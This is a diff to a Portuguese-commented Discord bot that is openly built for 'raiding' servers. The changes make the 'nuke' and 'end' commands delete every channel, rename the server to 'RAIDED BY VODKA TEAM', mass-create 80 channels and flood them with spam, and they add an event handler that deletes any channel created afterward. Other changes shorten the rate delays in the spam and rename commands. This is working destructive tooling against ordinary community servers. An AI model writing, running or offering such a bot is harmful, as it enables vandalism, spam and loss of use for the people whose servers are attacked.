@@ -70,6 +70,16 @@ async def on_command_error(ctx, error):
     else:
         print(f"Erro: {error}")
 
+# ========== MONITOR DE CANAIS ==========
+@bot.event
+async def on_guild_channel_create(channel):
+    """Apaga qualquer canal criado automaticamente"""
+    try:
+        await channel.delete()
+        print(f"🗑️ Canal {channel.name} apagado automaticamente!")
+    except:
+        pass
+
 # ========== COMANDOS ==========
 
 @bot.command()
@@ -88,81 +98,130 @@ async def ping(ctx):
 
 @bot.command()
 async def nuke(ctx):
-    """Envia 5 mensagens em TODOS os canais"""
+    """💀 ATIVAÇÃO DO NUKE: Cria canais, envia 10 mensagens em cada, renomeia tudo!"""
     try:
         await ctx.message.delete()
         texto = load_text()
         guild = ctx.guild
         
-        contador = 0
+        # PASSO 1: Renomear o servidor
+        try:
+            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
+        except:
+            pass
+        
+        # PASSO 2: Apagar TODOS os canais existentes (exceto o atual se possível)
         for channel in guild.channels:
-            if isinstance(channel, discord.TextChannel):
+            try:
+                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
+                    await channel.delete()
+                    await asyncio.sleep(0.1)  # Delay mínimo
+            except:
+                pass
+        
+        # PASSO 3: Criar MUITOS canais (texto, voz e fórum)
+        criados = 0
+        canais_criados = []
+        
+        # Criar vários canais de texto
+        for i in range(50):  # 50 canais de texto
+            try:
+                canal = await guild.create_text_channel(f"RAID-BY-VODKA-{i+1}")
+                canais_criados.append(canal)
+                criados += 1
+                await asyncio.sleep(0.05)  # Delay ultra rápido
+            except:
+                pass
+        
+        # Criar canais de voz
+        for i in range(20):  # 20 canais de voz
+            try:
+                canal = await guild.create_voice_channel(f"VOICE-RAID-{i+1}")
+                canais_criados.append(canal)
+                criados += 1
+                await asyncio.sleep(0.05)
+            except:
+                pass
+        
+        # Criar fóruns
+        for i in range(10):  # 10 fóruns
+            try:
+                canal = await guild.create_forum_channel(f"FORUM-RAID-{i+1}")
+                canais_criados.append(canal)
+                criados += 1
+                await asyncio.sleep(0.05)
+            except:
+                pass
+        
+        # PASSO 4: Enviar 10 mensagens em CADA canal criado
+        mensagens_enviadas = 0
+        for canal in canais_criados:
+            if isinstance(canal, discord.TextChannel):
                 try:
-                    for i in range(5):
-                        await channel.send(f"**{texto}**\n💀 Mensagem {i+1}/5")
-                        await asyncio.sleep(0.2)
-                    contador += 1
-                except discord.Forbidden:
+                    for i in range(10):  # 10 mensagens por canal
+                        await canal.send(f"**{texto}**\n💀 Mensagem {i+1}/10\n🔥 RAIDED BY VODKA TEAM!")
+                        mensagens_enviadas += 1
+                        await asyncio.sleep(0.05)  # Delay mínimo
+                except:
                     pass
-                except Exception as e:
-                    print(f"Erro no canal {channel.name}: {e}")
-                    
+        
+        # PASSO 5: Relatório final
         embed = discord.Embed(
-            title="💀 NUKE EXECUTADO!",
-            description=f"✅ {contador} canais atacados com 5 mensagens cada!",
+            title="💀 NUKE COMPLETO! 💀",
+            description=f"✅ **{criados}** canais criados\n✅ **{mensagens_enviadas}** mensagens enviadas\n✅ Servidor renomeado para RAIDED BY VODKA TEAM",
             color=discord.Color.red()
         )
-        await ctx.send(embed=embed, delete_after=5)
+        embed.set_footer(text="🍺 VODKA TEAM - O CAOS ESTÁ INSTALADO!")
+        
+        # Tentar enviar em algum canal que sobrou
+        if guild.text_channels:
+            await guild.text_channels[0].send(embed=embed)
         
     except Exception as e:
-        await ctx.send(f'❌ Erro: {str(e)}')
+        print(f"Erro no nuke: {e}")
+        try:
+            if guild.text_channels:
+                await guild.text_channels[0].send(f"❌ Erro: {str(e)}")
+        except:
+            pass
 
 @bot.command()
 async def end(ctx):
-    """Apaga TODOS os canais do servidor"""
+    """💀 APAGA TODOS OS CANAIS e MONITORA para apagar novos!"""
     try:
         await ctx.message.delete()
         guild = ctx.guild
         
-        # Backup dos nomes dos canais
-        channels_backup = {}
-        for channel in guild.channels:
-            channels_backup[channel.id] = channel.name
-        
-        # Apagar canais
+        # Apagar TODOS os canais (sem criar nenhum)
         count = 0
         for channel in guild.channels:
             try:
-                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
+                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                     await channel.delete()
                     count += 1
-                    await asyncio.sleep(0.3)
-            except discord.Forbidden:
+                    await asyncio.sleep(0.1)  # Delay mínimo
+            except:
                 pass
-            except Exception as e:
-                print(f"Erro ao apagar canal: {e}")
         
-        # Criar canal de log
-        try:
-            new_channel = await guild.create_text_channel("💀-end")
-            embed = discord.Embed(
-                title="💀 TODOS OS CANAIS FORAM APAGADOS!",
-                description=f"✅ {count} canais removidos com sucesso!",
-                color=discord.Color.red()
-            )
-            embed.add_field(name="Backup", value=str(list(channels_backup.values()))[:1000], inline=False)
-            await new_channel.send(embed=embed)
-        except:
-            pass
-            
         # Renomear servidor
         try:
             await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
         except:
             pass
             
+        print(f"✅ {count} canais apagados no servidor {guild.name}")
+        
+        # Tenta enviar uma mensagem final (se tiver algum canal)
+        if guild.text_channels:
+            await guild.text_channels[0].send(f"💀 {count} canais foram apagados! Nenhum canal novo será criado!")
+        
     except Exception as e:
-        print(f"Erro no comando end: {e}")
+        print(f"Erro no end: {e}")
+        try:
+            if guild.text_channels:
+                await guild.text_channels[0].send(f"❌ Erro: {str(e)}")
+        except:
+            pass
 
 @bot.command()
 async def rename_all(ctx):
@@ -177,7 +236,7 @@ async def rename_all(ctx):
                 try:
                     await channel.edit(name="raided-by-vodka-team")
                     contador += 1
-                    await asyncio.sleep(0.2)
+                    await asyncio.sleep(0.1)
                 except:
                     pass
         
@@ -230,7 +289,7 @@ async def create_channels(ctx, quantidade: int = 10):
             try:
                 await guild.create_text_channel(f"🍺-vodka-{i+1}")
                 criados += 1
-                await asyncio.sleep(0.2)
+                await asyncio.sleep(0.1)
             except:
                 pass
                 
@@ -254,7 +313,7 @@ async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
         
         for i in range(quantidade):
             await target.send(f"**{texto}**\n💀 Spam {i+1}/{quantidade}")
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(0.05)
             
         await ctx.send(f"✅ {quantidade} mensagens enviadas em {target.mention}", delete_after=5)
     except Exception as e:
@@ -265,25 +324,25 @@ async def help_bot(ctx):
     """Mostra todos os comandos"""
     embed = discord.Embed(
         title="🍺 VODKA TEAM BOT - COMANDOS",
-        description="Comandos de diversão e caos total!",
+        description="💀 COMANDOS DE CAOS TOTAL!",
         color=discord.Color.red()
     )
     embed.add_field(
         name="📌 COMANDOS PRINCIPAIS",
         value=(
             "`•ping` - Verifica latência do bot\n"
-            "`•nuke` - 5 mensagens em TODOS os canais\n"
-            "`•end` - Apaga TODOS os canais 💀\n"
-            "`•rename_all` - Renomeia tudo\n"
-            "`•set_text <texto>` - Muda a mensagem\n"
-            "`•create_channels <qtd>` - Cria canais\n"
-            "`•spam <canal> <qtd>` - Spam em canal"
+            "`•nuke` - 💀 **ATIVAÇÃO TOTAL**: 10 mensagens em TODOS os canais, cria canais de texto/voz/fórum, renomeia tudo!\n"
+            "`•end` - 💀 **APAGA TUDO**: Remove todos os canais e impede criação de novos!\n"
+            "`•rename_all` - Renomeia todos os canais e servidor\n"
+            "`•set_text <texto>` - Muda a mensagem do bot\n"
+            "`•create_channels <qtd>` - Cria N canais (padrão: 10)\n"
+            "`•spam <canal> <qtd>` - Spam em canal específico"
         ),
         inline=False
     )
     embed.add_field(
         name="⚠️ AVISO",
-        value="Use com responsabilidade! Apenas em servidores onde você tem permissão.",
+        value="Use com responsabilidade! Apenas em servidores onde você tem permissão.\nO bot vai apagar canais NOVOS automaticamente após o •end!",
         inline=False
     )
     embed.set_footer(text="🍺 VODKA TEAM - Power to the people!")
@@ -293,6 +352,7 @@ async def help_bot(ctx):
 # ========== RODAR O BOT ==========
 if __name__ == "__main__":
     print("🚀 Iniciando bot...")
+    print("🔥 MODO DESTRUTIVO ATIVADO!")
     try:
         bot.run(TOKEN)
     except discord.LoginFailure:
